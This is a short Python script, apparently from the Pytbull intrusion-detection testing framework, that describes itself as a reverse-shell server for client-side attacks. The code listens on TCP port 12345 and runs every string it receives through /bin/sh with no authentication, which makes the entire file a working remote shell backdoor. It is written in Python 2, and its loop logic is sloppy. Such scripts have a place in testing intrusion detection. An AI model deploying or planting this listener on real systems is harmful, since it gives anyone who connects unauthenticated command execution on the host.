#!/usr/bin/env python
"""
Pytbull server script (reverse shell)
Used for client side attacks
"""
import sys, socket, subprocess
host = ''               
port = 12345
socksize = 1024

# Open a socket on localhost, port 12345/tcp
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
print("Server started on port: %s" %port)
s.listen(1)
print("Listening...")
conn, addr = s.accept()
while True:
    print 'New connection from %s:%d' % (addr[0], addr[1])
    data = conn.recv(socksize)
    cmd = ['/bin/sh', '-c', data]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE).wait()
    if not data:
        break
    elif data == 'killsrv':
        sys.exit()

